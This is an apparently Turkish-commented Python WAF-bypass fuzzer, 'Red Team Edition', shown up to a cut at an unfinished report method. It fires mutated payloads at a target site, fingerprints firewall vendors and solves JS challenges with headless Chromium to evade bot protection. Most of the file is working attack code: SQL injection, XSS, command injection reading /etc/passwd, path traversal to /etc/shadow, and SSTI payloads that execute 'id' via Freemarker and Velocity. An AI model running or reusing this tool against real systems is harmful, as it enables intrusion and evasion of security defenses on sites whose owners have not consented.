#!/usr/bin/env python3
"""
WAF Fuzzer v2 — Red Team Edition
Sıfırdan yeniden yazılmış, genişletilmiş mutation engine, body-diff bypass detection,
WAF fingerprinting ve opsiyonel JS challenge (Playwright) desteği ile.

Yalnızca yetkili/izinli ortamlarda kullanılmalıdır.

Kurulum:
    pip install aiohttp rich playwright
    playwright install chromium   # (opsiyonel, --js-challenge için)
"""

import asyncio
import argparse
import sys
import os
import re
import json
import time
import random
import hashlib
import difflib
import unicodedata
from urllib.parse import quote, urlencode
from dataclasses import dataclass, field
from typing import Optional

import aiohttp
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn, SpinnerColumn
from rich.theme import Theme
from rich.panel import Panel
from rich import box

# ---------------------------------------------------------------------------
# Tema
# ---------------------------------------------------------------------------
custom_theme = Theme({
    "info":      "deep_sky_blue1",
    "warning":   "dark_violet",
    "danger":    "bold red",
    "success":   "bold bright_green",
    "primary":   "deep_sky_blue1",
    "secondary": "dark_violet",
    "muted":     "grey50",
})
console = Console(theme=custom_theme)

# ---------------------------------------------------------------------------
# Sabitler
# ---------------------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "curl/8.6.0",
    "python-requests/2.31.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]

# WAF imzaları: header / body / status pattern'leri
WAF_SIGNATURES = {
    "Cloudflare": {
        "headers":  ["cf-ray", "cf-cache-status", "cf-request-id"],
        "body":     ["Cloudflare", "cloudflare", "__cf_chl", "cf-browser-verification"],
        "status":   [403, 503],
    },
    "AWS WAF": {
        "headers":  ["x-amzn-requestid", "x-amz-cf-id"],
        "body":     ["AWS WAF", "Request blocked"],
        "status":   [403],
    },
    "Imperva (Incapsula)": {
        "headers":  ["x-iinfo", "x-cdn"],
        "body":     ["Incapsula incident", "_Incapsula_Resource", "incap_ses"],
        "status":   [403],
    },
    "Akamai": {
        "headers":  ["x-check-cacheable", "akamai-grn", "x-akamai-session-id"],
        "body":     ["Reference #", "Access Denied - Akamai"],
        "status":   [403],
    },
    "ModSecurity": {
        "headers":  ["x-mod-security-message"],
        "body":     ["Mod_Security", "ModSecurity", "This error was generated by Mod_Security"],
        "status":   [403, 406, 501],
    },
    "F5 BIG-IP ASM": {
        "headers":  ["x-cnection", "x-wa-info"],
        "body":     ["The requested URL was rejected", "F5 BIG-IP"],
        "status":   [403],
    },
    "Sucuri": {
        "headers":  ["x-sucuri-id", "x-sucuri-cache"],
        "body":     ["Sucuri WebSite Firewall", "Access Denied - Sucuri"],
        "status":   [403],
    },
    "Barracuda": {
        "headers":  ["barracuda_"],
        "body":     ["Barracuda Web Application Firewall", "barra_counter_session"],
        "status":   [403],
    },
    "Wordfence": {
        "headers":  [],
        "body":     ["Wordfence", "This response was generated by Wordfence", "wfCBL"],
        "status":   [403],
    },
    "Nginx (generic)": {
        "headers":  ["x-nginx"],
        "body":     ["nginx", "400 Bad Request", "403 Forbidden"],
        "status":   [400, 403],
    },
}


# ---------------------------------------------------------------------------
# Yardımcı: Unicode normalizasyon tabloları
# ---------------------------------------------------------------------------
def _build_unicode_alt_map() -> dict[str, list[str]]:
    """
    ASCII karakterleri için görsel/semantik unicode alternatifler.
    Tam bir harita değil — WAF bypass'ta kullanılan yaygın olanlar.
    """
    return {
        "a": ["\u0430", "\u0061", "\uFF41"],   # Cyrillic a, Latin a, Fullwidth a
        "e": ["\u0435", "\uFF45"],
        "o": ["\u043E", "\uFF4F", "\u00F8"],
        "s": ["\u0455", "\uFF53"],
        "c": ["\u0441", "\uFF43"],
        "i": ["\u0456", "\uFF49"],
        "p": ["\u0440", "\uFF50"],
        "<": ["\uFE64", "\u02C2"],
        ">": ["\uFE65", "\u02C3"],
        "'": ["\u2018", "\u2019", "\uFF07"],
        "\"": ["\u201C", "\u201D", "\uFF02"],
        "/": ["\u2215", "\uFF0F"],
        " ": ["\u00A0", "\u2009", "\u200A"],
    }

UNICODE_ALT = _build_unicode_alt_map()


# ---------------------------------------------------------------------------
# MutationEngine — Tam genişletilmiş
# ---------------------------------------------------------------------------
class MutationEngine:
    """
    Her payload için 10+ farklı obfuscation kategorisinden varyant üretir.
    Context: sqli | xss | cmdi | path | ssti | general
    """

    @staticmethod
    def generate(baseline: str, context: str = "general") -> list[str]:
        muts: set[str] = set()
        muts.add(baseline)

        # --- 1. Encoding katmanları ---
        muts.update(MutationEngine._encodings(baseline))

        # --- 2. Space obfuscation ---
        muts.update(MutationEngine._space_subs(baseline))

        # --- 3. Case permütasyonları ---
        muts.update(MutationEngine._case_perms(baseline))

        # --- 4. Null byte / kontrolcü karakterler ---
        muts.update(MutationEngine._null_and_control(baseline))

        # --- 5. HPP (HTTP Parameter Pollution) ---
        muts.update(MutationEngine._hpp(baseline))

        # --- 6. Unicode alternatifleri ---
        muts.update(MutationEngine._unicode_alts(baseline))

        # --- 7. Comment injection (SQL/JS stili) ---
        muts.update(MutationEngine._comment_inject(baseline))

        # --- 8. Chunked / line folding ---
        muts.update(MutationEngine._line_folding(baseline))

        # --- Context'e özel ---
        if context == "sqli":
            muts.update(MutationEngine._sqli(baseline))
        elif context == "xss":
            muts.update(MutationEngine._xss(baseline))
        elif context == "cmdi":
            muts.update(MutationEngine._cmdi(baseline))
        elif context == "path":
            muts.update(MutationEngine._path_traversal(baseline))
        elif context == "ssti":
            muts.update(MutationEngine._ssti(baseline))

        # None / boş stringleri çıkar
        return [m for m in muts if m and m.strip()]

    # -----------------------------------------------------------------------
    @staticmethod
    def _encodings(p: str) -> list[str]:
        variants = []
        # URL encode
        variants.append(quote(p, safe=""))
        # Double URL encode
        variants.append(quote(quote(p, safe=""), safe=""))
        # Triple URL encode (nadir ama bazı WAF'lar 3 tur decode yapar)
        variants.append(quote(quote(quote(p, safe=""), safe=""), safe=""))
        # Hex encode her karakter: \xNN
        variants.append("".join(f"\\x{ord(c):02x}" for c in p))
        # HTML entity (decimal)
        variants.append("".join(f"&#{ord(c)};" for c in p))
        # HTML entity (hex)
        variants.append("".join(f"&#x{ord(c):02x};" for c in p))
        # Base64 — bazı WAF'lar decoded body üzerinde çalışmaz
        import base64
        b64 = base64.b64encode(p.encode()).decode()
        variants.append(b64)
        variants.append(f"base64_decode('{b64}')")
        # Octal (JS tarzı)
        variants.append("".join(f"\\{ord(c):03o}" for c in p))
        # UTF-16 surrogate pairs (bazı parser'lar)
        try:
            utf16 = p.encode("utf-16-le")
            variants.append("%u" + "%u".join(f"{utf16[i]:02x}{utf16[i+1]:02x}" for i in range(0, len(utf16), 2)))
        except Exception:
            pass
        return variants

    @staticmethod
    def _space_subs(p: str) -> list[str]:
        if " " not in p:
            return []
        subs = ["/**/", "%09", "%0A", "%0D", "%0C", "%0B", "+", "\t", "\r\n\t", "/*!*/"]
        return [p.replace(" ", s) for s in subs]

    @staticmethod
    def _case_perms(p: str) -> list[str]:
        variants = [p.upper(), p.lower()]
        # Alternatif büyük/küçük (2 yön)
        variants.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)))
        variants.append("".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(p)))
        # Random case (3 farklı örnek)
        for _ in range(3):
            variants.append("".join(random.choice([c.upper(), c.lower()]) for c in p))
        return variants

    @staticmethod
    def _null_and_control(p: str) -> list[str]:
        variants = []
        for nb in ["%00", "\x00", "%u0000", "\\0"]:
            variants.append(p + nb)
            variants.append(nb + p)
            # Ortasına enjekte (ilk boşluğa ya da ikinci karaktere)
            mid = len(p) // 2
            variants.append(p[:mid] + nb + p[mid:])
        # Unicode BOM
        variants.append("\ufeff" + p)
        variants.append(p + "\ufeff")
        return variants

    @staticmethod
    def _hpp(p: str) -> list[str]:
        variants = []
        decoys = ["safe_val", "normal_input", "test123", "hello"]
        for d in decoys:
            variants.append(f"{d}=ok&payload={quote(p, safe='')}")
            variants.append(f"payload={quote(p, safe='')}&{d}=ok")
        return variants

    @staticmethod
    def _unicode_alts(p: str) -> list[str]:
        """Her karakteri unicode alternatifiyle değiştiren tek tek varyantlar üretir."""
        variants = []
        for i, ch in enumerate(p):
            alts = UNICODE_ALT.get(ch.lower(), [])
            for alt in alts:
                new = p[:i] + alt + p[i+1:]
                variants.append(new)
        # NFC / NFKC normalizasyon sonrası (bazı WAF'lar normalize eder, sunucu etmeyebilir)
        try:
            variants.append(unicodedata.normalize("NFKC", p))
            variants.append(unicodedata.normalize("NFC", p))
        except Exception:
            pass
        return variants

    @staticmethod
    def _comment_inject(p: str) -> list[str]:
        """Kelimeler arasına SQL/JS/HTML comment enjekte et."""
        variants = []
        words = p.split(" ")
        if len(words) < 2:
            return []
        # SQL: SELECT/**/FROM
        for comment in ["/**/", "/*!*/", "/*!\n*/", "-- \n", "#\n"]:
            variants.append(comment.join(words))
        # HTML comment: se<!--x-->lect
        if len(words[0]) > 2:
            w = words[0]
            mid = len(w) // 2
            variants.append(w[:mid] + "<!--x-->" + w[mid:] + " " + " ".join(words[1:]))
        return variants

    @staticmethod
    def _line_folding(p: str) -> list[str]:
        """HTTP header line folding / CRLF injection denemeleri."""
        return [
            p.replace(" ", "\r\n "),       # RFC 2822 line folding
            p + "\r\n X-Injected: true",   # header injection attempt
            p + "%0d%0aX-Injected:%20true",
        ]

    # -----------------------------------------------------------------------
    # CONTEXT: SQL Injection
    # -----------------------------------------------------------------------
    @staticmethod
    def _sqli(p: str) -> list[str]:
        variants = []
        upper = p.upper()

        # Operator substitution
        for old, new in [("OR", "||"), ("AND", "&&"), ("=", " LIKE "),
                         ("!=", "<>"), ("UNION", "UNION ALL"), ("SELECT", "SEL\x00ECT")]:
            if old in upper:
                variants.append(re.sub(re.escape(old), new, p, flags=re.IGNORECASE))

        # Tautology varyantları
        tautologies = [
            "' OR '1'='1", "' OR 1=1--", "1' OR '1'='1'--",
            "' OR 1=1#", "' OR 1=1/*", "\" OR \"1\"=\"1",
            "1 OR 1=1", "1' OR 1=1 LIMIT 1--",
        ]
        variants.extend(tautologies)

        # Stacked query denemeleri
        variants.extend([p + ";--", p + "; SELECT 1--", p + "; WAITFOR DELAY '0:0:5'--"])

        # Time-based blind
        variants.extend([
            p + " AND SLEEP(5)--",
            p + " AND 1=BENCHMARK(5000000,MD5(1))--",
            p + "'; WAITFOR DELAY '0:0:5'--",
            p + " OR pg_sleep(5)--",
        ])

        # Error-based
        variants.extend([
            p + " AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            p + " AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ])

        # WAF bypass: inline comments içinde keyword gizle
        for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]:
            if kw in upper:
                hidden = f"/*!{kw}*/"
                variants.append(re.sub(kw, hidden, p, flags=re.IGNORECASE))

        # Hex string literals (MySQL)
        variants.append(p.replace("'", "0x" + p.encode().hex()))

        return variants

    # -----------------------------------------------------------------------
    # CONTEXT: XSS
    # -----------------------------------------------------------------------
    @staticmethod
    def _xss(p: str) -> list[str]:
        variants = []

        # HTML entity encoding kısmî
        variants.append(p.replace("<", "&lt;").replace(">", "&gt;"))
        variants.append(p.replace("<", "\u003c").replace(">", "\u003e"))
        variants.append(p.replace("<", "%3C").replace(">", "%3E"))

        # Script tag varyantları
        script_variants = [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script/x>alert(1)</script>",
            "<script\t>alert(1)</script>",
            "<script\r\n>alert(1)</script>",
            "<%00script>alert(1)</script>",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<scr<!---->ipt>alert(1)</sc<!---->ript>",
        ]
        variants.extend(script_variants)

        # Event handler varyantları
        events = [
            "<img src=x onerror=alert(1)>",
            "<img src=x oNeRrOr=alert(1)>",
            "<img/src=x/onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<a href=javascript:alert(1)>X</a>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
        ]
        variants.extend(events)

        # JS template literal
        variants.extend([
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",  # Angular SSTI/XSS
            "#{alert(1)}",                                 # Ruby template
        ])

        # Data URI
        variants.extend([
            "<iframe src='data:text/html,<script>alert(1)</script>'>",
            "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSkv Pg==>",
        ])

        # CSS injection
        variants.extend([
            "<style>@import'javascript:alert(1)'</style>",
            "<link rel=stylesheet href=javascript:alert(1)>",
        ])

        # Payload wrapping
        variants.extend([
            f"\"><script>alert(1)</script>",
            f"'><script>alert(1)</script>",
            f"</title><script>alert(1)</script>",
            f"\";alert(1);//",
        ])

        # Mevcut payload üzerine case/encoding uygula
        if "onerror" in p.lower():
            variants.append(p.replace("onerror", "oNeRrOr").replace("onload", "oNlOaD"))
        if "<script>" in p.lower():
            variants.append(p.replace("<script>", "<sCrIpT>").replace("</script>", "</sCrIpT>"))

        return variants

    # -----------------------------------------------------------------------
    # CONTEXT: Command Injection
    # -----------------------------------------------------------------------
    @staticmethod
    def _cmdi(p: str) -> list[str]:
        variants = []
        separators = [";", "&&", "||", "|", "`", "$(", "\n", "%0A", "%3B"]
        commands = ["id", "whoami", "cat /etc/passwd", "ls", "dir"]

        for sep in separators:
            for cmd in commands:
                variants.extend([
                    f"{p}{sep}{cmd}",
                    f"{sep}{cmd}",
                    f"{p} {sep} {cmd}",
                ])

        # Obfuscation: IFS separator (bash)
        variants.extend([
            "${IFS}cat${IFS}/etc/passwd",
            "c'a't${IFS}/etc/passwd",
            "c\"a\"t /etc/passwd",
            "c\\at /etc/passwd",
        ])

        # Hex command execution (bash)
        cmd_hex = "".join(f"\\x{ord(c):02x}" for c in "id")
        variants.append(f'$\'\\x{cmd_hex}\'')

        # Wildcard bypass
        variants.extend(["/???/??t /???/p?ss?d", "/bin/c?t /etc/pass??"])

        # Encoded operators
        variants.extend([f"{p}%7c{cmd}" for cmd in commands])
        variants.extend([f"{p}%26%26{cmd}" for cmd in commands])

        return variants

    # -----------------------------------------------------------------------
    # CONTEXT: Path Traversal
    # -----------------------------------------------------------------------
    @staticmethod
    def _path_traversal(p: str) -> list[str]:
        base = "../" * 6 + "etc/passwd"
        variants = []
        traversals = [
            "../" * 6,
            "..%2F" * 6,
            "..%252F" * 6,          # double encoded
            "..%c0%af" * 6,         # overlong UTF-8
            "..%c1%9c" * 6,
            "....//....//....//",    # stripped ../ bypass
            "%2e%2e%2f" * 6,
            "%2e%2e/" * 6,
            "..%5c" * 6,            # Windows backslash
            "..%255c" * 6,
        ]
        targets = ["etc/passwd", "etc/shadow", "windows/win.ini",
                   "windows/system32/drivers/etc/hosts", "proc/self/environ"]

        for trav in traversals:
            for tgt in targets:
                variants.append(trav + tgt)

        # Absolute path bypass
        variants.extend([
            "/etc/passwd",
            "/etc/shadow",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ])

        # Null byte termination
        variants.extend([base + "%00.jpg", base + "\x00.png"])

        return variants

    # -----------------------------------------------------------------------
    # CONTEXT: SSTI (Server-Side Template Injection)
    # -----------------------------------------------------------------------
    @staticmethod
    def _ssti(p: str) -> list[str]:
        # Yaygın SSTI probe payloadları (Jinja2, Twig, Freemarker, Velocity, Thymeleaf)
        return [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "{{7*'7'}}",
            "{{config}}",
            "{{self}}",
            "{{''.class.mro[2].subclasses()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${{7*7}}",
            "%{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex",
        ]


# ---------------------------------------------------------------------------
# WAF Fingerprinting
# ---------------------------------------------------------------------------
class WAFFingerprinter:
    """
    Baseline isteğinin response header/body/status'ına bakarak WAF tespiti yapar.
    Birden fazla WAF eşleşebilir; güven skoru ile sıralar.
    """

    @staticmethod
    def fingerprint(status: int, headers: dict, body: str) -> list[tuple[str, int]]:
        """
        Returns: [(waf_name, confidence_pct), ...]  en yüksekten en düşüğe
        """
        scores: dict[str, int] = {}
        lower_body = body.lower()
        lower_headers = {k.lower(): v.lower() for k, v in headers.items()}

        for waf_name, sigs in WAF_SIGNATURES.items():
            score = 0

            # Header eşleşmesi (ağırlık: 3)
            for h in sigs["headers"]:
                if any(h.lower() in k for k in lower_headers):
                    score += 3

            # Body eşleşmesi (ağırlık: 2)
            for b in sigs["body"]:
                if b.lower() in lower_body:
                    score += 2

            # Status code eşleşmesi (ağırlık: 1)
            if status in sigs["status"]:
                score += 1

            if score > 0:
                scores[waf_name] = score

        if not scores:
            return []

        max_score = max(scores.values())
        # Normalize → yüzde (max olası skor = header*3 + body*2 + status*1)
        result = []
        for name, s in sorted(scores.items(), key=lambda x: x[1], reverse=True):
            pct = min(int((s / max(max_score, 1)) * 100), 99)
            result.append((name, pct))

        return result

    @staticmethod
    def display(results: list[tuple[str, int]]):
        if not results:
            console.print("[muted]WAF tespiti yapılamadı veya WAF yok.[/muted]")
            return

        console.print("\n[primary]── WAF Fingerprint ──────────────────────────────[/primary]")
        for name, conf in results:
            bar = "█" * (conf // 10) + "░" * (10 - conf // 10)
            color = "success" if conf >= 70 else "warning" if conf >= 40 else "muted"
            console.print(f"  [{color}]{name:25s}[/{color}] {bar} {conf}%")
        console.print()


# ---------------------------------------------------------------------------
# Bypass Detection — Body Diff tabanlı
# ---------------------------------------------------------------------------
@dataclass
class BaselineProfile:
    status: int
    length: int
    body_hash: str          # SHA256 of response body
    body_sample: str        # İlk 512 karakter
    headers: dict           = field(default_factory=dict)
    blocked_keywords: list  = field(default_factory=list)

class BypassDetector:
    """
    Bir response'un gerçekten bypass mı yoksa false positive mi olduğunu belirler.
    
    Yöntemler:
    1. Status code farkı
    2. Body hash farkı (içerik değişti mi?)
    3. Response length delta (>%20 fark)
    4. Benign body keyword eşleşmesi
    5. Blocked keyword yokluğu
    """

    # Bloklama sayfalarında sıkça geçen kelimeler
    BLOCK_KEYWORDS = [
        "blocked", "forbidden", "access denied", "not allowed", "firewall",
        "waf", "security", "rejected", "illegal", "attack", "malicious",
        "request id", "reference #", "incident", "violation",
    ]

    def __init__(self, benign_profile: BaselineProfile, blocked_profile: BaselineProfile):
        self.benign = benign_profile
        self.blocked = blocked_profile

    def analyze(self, payload: str, status: int, length: int, body: str) -> dict:
        """
        Returns: {
            "bypass": bool,
            "confidence": int (0-100),
            "reasons": list[str]
        }
        """
        reasons = []
        bypass_signals = 0
        total_signals = 5

        body_hash = hashlib.sha256(body.encode(errors="replace")).hexdigest()
        lower_body = body.lower()

        # Signal 1: Status farklı mı blocked'tan?
        if status == 429:
            return None
        if status != self.blocked.status and status not in [0, -1]:
            bypass_signals += 1
            reasons.append(f"Status değişti: {self.blocked.status} → {status}")

        # Signal 2: Body hash farklı mı blocked'tan?
        if body_hash != self.blocked.body_hash and body_hash != "":
            bypass_signals += 1
            reasons.append("Response body içeriği değişti")

        # Signal 3: Length delta > %20
        if self.blocked.length > 0:
            delta_pct = abs(length - self.blocked.length) / self.blocked.length
            if delta_pct > 0.20:
                bypass_signals += 1
                reasons.append(f"Response length delta: %{delta_pct*100:.0f}")

        # Signal 4: Block keyword yok mu?
        block_kw_in_resp = any(kw in lower_body for kw in self.BLOCK_KEYWORDS)
        block_kw_in_blocked = any(kw in self.blocked.body_sample.lower() for kw in self.BLOCK_KEYWORDS)
        if block_kw_in_blocked and not block_kw_in_resp:
            bypass_signals += 1
            reasons.append("Bloklama keyword'ü response'ta yok")

        # Signal 5: Benign body'ye benzeme (difflib similarity)
        if self.benign.body_sample and body:
            similarity = difflib.SequenceMatcher(None, self.benign.body_sample[:200], body[:200]).ratio()
            if similarity > 0.65:
                bypass_signals += 1
                reasons.append(f"Benign response'a benziyor (similarity: {similarity:.2f})")

        confidence = int((bypass_signals / total_signals) * 100)
        is_bypass = bypass_signals >= 2  # En az 2 sinyal gerekli

        return {
            "bypass":     is_bypass,
            "confidence": confidence,
            "reasons":    reasons,
            "status":     status,
            "length":     length,
            "signals":    f"{bypass_signals}/{total_signals}",
        }


# ---------------------------------------------------------------------------
# JS Challenge Handler (Playwright)
# ---------------------------------------------------------------------------
class JSChallengeHandler:
    """
    Cloudflare/Akamai gibi JS challenge sayfalarını geçmek için
    headless Chromium kullanır (Playwright gerektirir).
    Cookie ve User-Agent'ı kazandıktan sonra aiohttp'a devreder.
    """

    def __init__(self, url: str, proxy: Optional[str] = None, timeout: int = 30):
        self.url = url
        self.proxy = proxy
        self.timeout = timeout
        self._cookies: dict = {}
        self._ua: str = ""
        self._solved = False

    async def solve(self) -> bool:
        """
        Returns True if challenge solved successfully.
        """
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            console.print("[danger]Playwright kurulu değil. 'pip install playwright && playwright install chromium'[/danger]")
            return False

        console.print("[warning]JS challenge tespit edildi, Playwright ile çözülüyor...[/warning]")

        async with async_playwright() as pw:
            launch_opts = {"headless": True}
            if self.proxy:
                launch_opts["proxy"] = {"server": self.proxy}

            browser = await pw.chromium.launch(**launch_opts)
            context = await browser.new_context()
            page = await context.new_page()

            try:
                await page.goto(self.url, timeout=self.timeout * 1000)
                # JS challenge'ın çözülmesini bekle (5-15 sn)
                await page.wait_for_load_state("networkidle", timeout=self.timeout * 1000)

                # Cookie'leri al
                cookies = await context.cookies()
                self._cookies = {c["name"]: c["value"] for c in cookies}
                self._ua = await page.evaluate("navigator.userAgent")
                self._solved = True
                console.print(f"[success]JS challenge çözüldü. {len(self._cookies)} cookie alındı.[/success]")
            except Exception as e:
                console.print(f"[danger]JS challenge çözülemedi: {e}[/danger]")
                self._solved = False
            finally:
                await browser.close()

        return self._solved

    @property
    def cookies(self) -> dict:
        return self._cookies

    @property
    def user_agent(self) -> str:
        return self._ua


# ---------------------------------------------------------------------------
# Ana Fuzzer
# ---------------------------------------------------------------------------
@dataclass
class FuzzResult:
    payload: str
    status: int
    length: int
    bypass: bool
    confidence: int
    reasons: list[str]
    signals: str


class WAFFuzzer:
    def __init__(self, url: str, method: str = "GET", data: Optional[str] = None,
                 headers: Optional[dict] = None, cookies: Optional[dict] = None,
                 proxy: Optional[str] = None, rate_limit: float = 0.0,
                 timeout: int = 10, verbose: bool = False, chunked: bool = False,
                 concurrency: int = 30, js_challenge: bool = False):

        self.url          = url
        self.method       = method.upper()
        self.data         = data
        self.headers      = headers or {}
        self.cookies      = cookies or {}
        self.proxy        = proxy
        self.rate_limit   = rate_limit
        self.timeout      = timeout
        self.verbose      = verbose
        self.chunked      = chunked
        self.concurrency  = concurrency
        self.js_challenge = js_challenge

        self.results: list[FuzzResult] = []
        self.benign_profile:  Optional[BaselineProfile] = None
        self.blocked_profile: Optional[BaselineProfile] = None
        self.waf_names:       list[tuple[str, int]] = []

        # Injection noktası
        if "FUZZ" not in self.url and self.method == "GET" and not self.data:
            sep = "&" if "?" in self.url else "?"
            self.target_url = f"{self.url}{sep}q=FUZZ"
        else:
            self.target_url = self.url

    def _inject(self, payload: str) -> tuple[str, Optional[str]]:
        safe_p = payload.replace(" ", "%20")
        target = self.target_url.replace("FUZZ", safe_p)
        body = self.data.replace("FUZZ", payload) if self.data else None
        return target, body

    async def _fetch_raw(self, session: aiohttp.ClientSession,
                         payload: str) -> tuple[str, int, int, str, dict]:
        """
        Returns: (payload, status, len, body_text, response_headers)
        """
        target, body = self._inject(payload)

        req_headers = self.headers.copy()
        if "User-Agent" not in req_headers:
            req_headers["User-Agent"] = random.choice(USER_AGENTS)

        if self.rate_limit > 0:
            await asyncio.sleep(self.rate_limit)

        ssl_ctx = False if self.proxy else None
        is_chunked = self.chunked if self.method in ["POST", "PUT"] and body else None

        try:
            async with session.request(
                method=self.method,
                url=target,
                data=body,
                headers=req_headers,
                cookies=self.cookies,
                proxy=self.proxy,
                ssl=ssl_ctx,
                chunked=is_chunked,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                allow_redirects=True,
            ) as resp:
                raw = await resp.read()
                try:
                    body_text = raw.decode("utf-8", errors="replace")
                except Exception:
                    body_text = ""
                return payload, resp.status, len(raw), body_text, dict(resp.headers)

        except asyncio.TimeoutError:
            return payload, 0, 0, "", {}
        except Exception:
            return payload, -1, 0, "", {}

    async def _make_session(self) -> aiohttp.ClientSession:
        connector = aiohttp.TCPConnector(
            limit_per_host=self.concurrency,
            ssl=False if self.proxy else None,
        )
        return aiohttp.ClientSession(connector=connector)

    # -----------------------------------------------------------------------
    # JS Challenge
    # -----------------------------------------------------------------------
    async def _handle_js_challenge(self):
        if not self.js_challenge:
            return
        handler = JSChallengeHandler(self.url, proxy=self.proxy, timeout=30)
        solved = await handler.solve()
        if solved:
            self.cookies.update(handler.cookies)
            if handler.user_agent:
                self.headers["User-Agent"] = handler.user_agent

    # -----------------------------------------------------------------------
    # Baseline Check
    # -----------------------------------------------------------------------
    async def run_baseline(self, benign_str: str, malicious_payload: str) -> bool:
        console.print("\n[primary]── Baseline Check ───────────────────────────────[/primary]")
        await self._handle_js_challenge()

        async with await self._make_session() as session:
            # 1. Benign istek
            _, b_status, b_len, b_body, b_headers = await self._fetch_raw(session, benign_str)
            if b_status not in [200, 301, 302, 304, 404]:
                console.print(f"[danger]Benign istek başarısız (HTTP {b_status}). Sunucu erişilebilir mi?[/danger]")
                return False

            self.benign_profile = BaselineProfile(
                status=b_status, length=b_len,
                body_hash=hashlib.sha256(b_body.encode(errors="replace")).hexdigest(),
                body_sample=b_body[:512],
                headers=b_headers,
            )
            console.print(f"[success]✔[/success] Benign  → HTTP {b_status} | {b_len} bytes")

            # WAF fingerprint (benign üzerinden header bilgisi al)
            self.waf_names = WAFFingerprinter.fingerprint(b_status, b_headers, b_body)

            # 2. Malicious baseline
            _, m_status, m_len, m_body, m_headers = await self._fetch_raw(session, malicious_payload)

            # WAF fingerprint — blocked response üzerinden tekrar (daha kesin)
            waf_from_block = WAFFingerprinter.fingerprint(m_status, m_headers, m_body)
            if waf_from_block:
                self.waf_names = waf_from_block  # blocked response daha güvenilir

            if m_status == b_status or m_status in [200, 301, 302]:
                console.print(
                    f"[danger]Baseline payload bloklanmadı (HTTP {m_status}). "
                    f"WAF yoksa veya payload zaten geçiyor olabilir. Devam etmek risklidir.[/danger]"
                )
                console.print("[warning]--force flag'i ile devam edebilirsiniz (false positive riski yüksek).[/warning]")
                return False

            self.blocked_profile = BaselineProfile(
                status=m_status, length=m_len,
                body_hash=hashlib.sha256(m_body.encode(errors="replace")).hexdigest(),
                body_sample=m_body[:512],
                headers=m_headers,
                blocked_keywords=[kw for kw in BypassDetector.BLOCK_KEYWORDS if kw in m_body.lower()],
            )
            console.print(f"[success]✔[/success] Malicious → HTTP {m_status} | {m_len} bytes (bloklandı)")

        WAFFingerprinter.display(self.waf_names)
        return True

    # -----------------------------------------------------------------------
    # Fuzzing
    # -----------------------------------------------------------------------
    async def fuzz(self, mutations: list[str]):
        console.print(f"[primary]── Fuzzing Başlıyor: {len(mutations)} mutation ─────────────[/primary]\n")

        detector = BypassDetector(self.benign_profile, self.blocked_profile)
        semaphore = asyncio.Semaphore(self.concurrency)

        async with await self._make_session() as session:
            with Progress(
                SpinnerColumn(style="primary"),
                TextColumn("[primary]{task.description}"),
                BarColumn(style="secondary", complete_style="success"),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                console=console,
            ) as progress:
                task = progress.add_task("Fuzzing WAF...", total=len(mutations))

                async def _worker(payload: str):
                    async with semaphore:
                        if self.rate_limit > 0:
                            await asyncio.sleep(self.rate_limit)
                        pl, status, length, body, _ = await self._fetch_raw(session, payload)
                        analysis = detector.analyze(pl, status, length, body)
                        self._record(pl, status, length, analysis)
                        progress.update(task, advance=1)

                if self.rate_limit > 0:
                    for pl in mutations:
                        await _worker(pl)
                else:
                    await asyncio.gather(*[_worker(pl) for pl in mutations])

    def _record(self, payload, status, length, analysis):
        if analysis is None:
            return  # 429 rate limit — atla
        r = FuzzResult(
            payload=payload,
            status=status,
            length=length,
            bypass=analysis["bypass"],
            confidence=analysis["confidence"],
            reasons=analysis["reasons"],
            signals=analysis["signals"],
        )
        self.results.append(r)

        if r.bypass:
            console.print(
                f"[success][BYPASS][/success] "
                f"HTTP {status} | {length}B | conf={r.confidence}% | signals={r.signals} | "
                f"{payload[:80]}"
            )
        elif self.verbose:
            console.print(
                f"[muted][BLOCK ][/muted]  "
                f"HTTP {status} | {length}B | {payload[:80]}"
            )

    # -----------------------------------------------------------------------
    # Rapor
    # -----------------------------------------------------------------------
    def display_report(self):
